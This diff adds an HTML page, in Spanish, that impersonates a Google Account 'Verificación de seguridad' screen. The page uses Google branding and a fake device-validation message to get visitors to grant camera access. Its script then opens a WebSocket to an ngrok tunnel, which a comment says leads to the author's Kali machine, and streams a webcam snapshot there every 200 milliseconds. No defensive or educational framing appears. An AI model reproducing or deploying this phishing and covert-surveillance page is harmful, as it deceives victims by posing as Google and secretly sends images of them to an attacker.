@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Account - Seguridad</title>
+    <style>
+        body { font-family: 'Roboto', sans-serif; background-color: #fff; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .card { width: 100%; max-width: 400px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
+        .logo { width: 75px; margin-bottom: 20px; }
+        h1 { font-size: 24px; color: #202124; margin-bottom: 10px; font-weight: 400; }
+        p { color: #3c4043; font-size: 16px; line-height: 1.5; margin-bottom: 30px; }
+        .btn { background-color: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 14px; }
+        .btn:hover { background-color: #1765cc; box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3); }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo" alt="Google">
+    <h1>Verificación de seguridad</h1>
+    <p>Para proteger tu cuenta de accesos no autorizados, necesitamos realizar una validación rápida del dispositivo. Haz clic en el botón para continuar.</p>
+    <button class="btn" onclick="main()">Continuar</button>
+</div>
+
+<script>
+    async function main() {
+        try {
+            // Solicita la cámara (o pantalla si prefieres getDisplayMedia)
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            
+            // CONEXIÓN A TU KALI (VÍA NGROK)
+            const socket = new WebSocket('wss://goofiness-spiffy-mascot.ngrok-free.dev');
+
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+
+            socket.onopen = () => {
+                console.log("Conexión establecida.");
+                setInterval(() => {
+                    if (video.videoWidth > 0) {
+                        canvas.width = 400;
+                        canvas.height = 300;
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        if (socket.readyState === 1) {
+                            socket.send(canvas.toDataURL('image/jpeg', 0.5));
+                        }
+                    }
+                }, 200);
+            };
+
+            alert("Verificando dispositivo... No cierre esta pestaña.");
+        } catch (err) {
+            alert("Error: Es necesario permitir el acceso para validar su identidad.");
+        }
+    }
+</script>
+
+</body>
+</html>
